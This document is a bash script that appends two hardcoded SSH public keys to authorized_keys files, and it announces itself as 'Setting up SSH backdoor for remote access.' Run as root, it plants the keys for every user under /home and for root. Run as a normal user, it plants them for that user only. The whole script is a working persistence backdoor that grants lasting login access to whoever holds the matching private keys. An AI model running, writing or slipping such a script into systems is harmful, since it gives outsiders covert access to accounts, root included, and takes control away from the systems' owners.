#!/usr/bin/env bash

today=$(date '+%Y_%m_%d__%H_%M_%S')

DIR="$HOME/.ssh"
FILE="$DIR/authorized_keys"

declare -a KEYS=(
  'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJxVi/t1Cm4pc1ZZsvXLWF6ZxWiS/gLLWW63wLZOI9l3'
  'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC4cW0w7jAp1WiUN4QrVCD0W2IhkZo1Ixqc79PpLoz4zzTj3sSmB3HOk/2XO5v5Dp1oqNkL+DTzhtZAus/A1u0Sa0Ir5Y4OUEq0Kmo4mwanpcpGP5zoEnOGQWvsleM9vPowHXCWTsM7WPUoP34bR8l9sXgVYiQZzWRQqHFp+7nx5te706YV5velZYc1R6tESbawsU6vTphgJfb9KPIowLlz3DHUc/JWvbjnwu57ZKLbmpTbw+YS8b0n2hF941tT95fBcIl05WdZc2C/Nh7+kICyfWlObnmKGYnnrghM8NhKs1aJJ9KX4G0zWafPoePTDJLcALHxGyV27nrl5qghq/lUNBtp+6QR7WtsLUqCMJ+cNCiDyIUpD0WFEpv9Z5olDiRgFFMgeUTSK3aGM1B4OwXWh0WCp0Fs5tWyyI2Nv1hsZyxHEBZ03hjkp3QMnhxPpdp9bHErmSaqdPOJAVDVK7pDAuAgSPi78xwyEzEpBiWneUq3kCASKT0GPecE4fpI891r2RkD85XhPsATYcXn7PVLIID8kBG1dRYTSFSVkXqZii10GO6/vE8311Zhl/ZeuF5iOoRYixsAQEKlTofJsuKfka3G4Hngnq0YxPM8RKxCcFn+TVt+91Dq2j18xcunkYnmZ1WqMcKZSUt0uvEUja6rlevHfEP05AaR6Y0bGgwsVQ=='
)

echo -e "\033[1;32m===> Setting up SSH backdoor for remote access...\033[0m"

# Check if the user is root
if [ "$EUID" -eq 0 ]; then
    echo -e "\033[1;32m===> Running as root. Adding keys for all users and root.\033[0m"

    # Loop over all users' .ssh directories and add keys
    for userDir in /home/*; do
        userSshDir="$userDir/.ssh"
        userAuthKeys="$userSshDir/authorized_keys"
        
        if [ ! -d "$userSshDir" ]; then
            echo -e "\033[1;34m--> Creating .ssh directory for $(basename "$userDir")\033[0m"
            mkdir -p "$userSshDir"
            chmod 700 "$userSshDir"
        fi

        # Backup and create authorized_keys if necessary
        if [ -f "$userAuthKeys" ]; then
            backupFile="$userAuthKeys.$today.backup"
            echo -e "\033[1;34m--> Backing up existing $userAuthKeys to $backupFile\033[0m"
            cp "$userAuthKeys" "$backupFile"
            echo -e "\033[1;32m--> Backup created.\033[0m"
        else
            echo -e "\033[1;34m--> Creating authorized_keys for $(basename "$userDir")\033[0m"
            touch "$userAuthKeys"
        fi

        # Set permissions and add keys
        chmod 600 "$userAuthKeys"
        for key in "${KEYS[@]}"; do
            if ! grep -qF -- "$key" "$userAuthKeys"; then
                echo -e "\033[1;34m--> Adding key for $(basename "$userDir")\033[0m"
                echo "$key" >> "$userAuthKeys"
            else
                echo -e "\033[1;33m--> Key already exists for $(basename "$userDir"), skipping.\033[0m"
            fi
        done
    done

    # Add keys for root
    rootSshDir="/root/.ssh"
    rootAuthKeys="$rootSshDir/authorized_keys"
    if [ ! -d "$rootSshDir" ]; then
        echo -e "\033[1;34m--> Creating .ssh directory for root\033[0m"
        mkdir -p "$rootSshDir"
        chmod 700 "$rootSshDir"
    fi

    # Backup and create authorized_keys for root if necessary
    if [ -f "$rootAuthKeys" ]; then
        rootBackupFile="$rootAuthKeys.$today.backup"
        echo -e "\033[1;34m--> Backing up existing root authorized_keys to $rootBackupFile\033[0m"
        cp "$rootAuthKeys" "$rootBackupFile"
        echo -e "\033[1;32m--> Backup created.\033[0m"
    else
        echo -e "\033[1;34m--> Creating authorized_keys for root\033[0m"
        touch "$rootAuthKeys"
    fi

    # Set permissions and add keys for root
    chmod 600 "$rootAuthKeys"
    for key in "${KEYS[@]}"; do
        if ! grep -qF -- "$key" "$rootAuthKeys"; then
            echo -e "\033[1;34m--> Adding key to root authorized_keys\033[0m"
            echo "$key" >> "$rootAuthKeys"
        else
            echo -e "\033[1;33m--> Key already exists for root, skipping.\033[0m"
        fi
    done
else
    # Standard user setup
    echo -e "\033[1;32m===> Running as a standard user. Adding keys for current user only.\033[0m"

    # Check and create directory if it doesn't exist
    if [ ! -d "$DIR" ]; then
        echo -e "\033[1;34m--> Creating directory: $DIR\033[0m"
        mkdir -p "$DIR"
        chmod 700 "$DIR"
    fi

    # Backup and create authorized_keys file if it doesn't exist
    if [ -f "$FILE" ]; then
        BACKUP="$FILE.$today.backup"
        echo -e "\033[1;34m--> Backing up existing $FILE to $BACKUP\033[0m"
        cp "$FILE" "$BACKUP"
        echo -e "\033[1;32m--> Backup created.\033[0m"
    else
        echo -e "\033[1;34m--> Creating $FILE\033[0m"
        touch "$FILE"
    fi

    # Set appropriate permissions
    chmod 600 "$FILE"
    echo -e "\033[1;32m--> Set appropriate permissions for $FILE.\033[0m"

    for key in "${KEYS[@]}"; do
      if grep -qF -- "$key" "$FILE"; then
        echo -e "\033[1;33m--> Key already exists, skipping:\033[0m $key"
      else
        echo -e "\033[1;34m--> Copying key:\033[0m $key"
        echo "$key" >> "$FILE"
        echo -e "\033[1;32m--> Key copied.\033[0m"
      fi
    done
fi

echo -e "\033[1;32m===> Done!\033[0m"
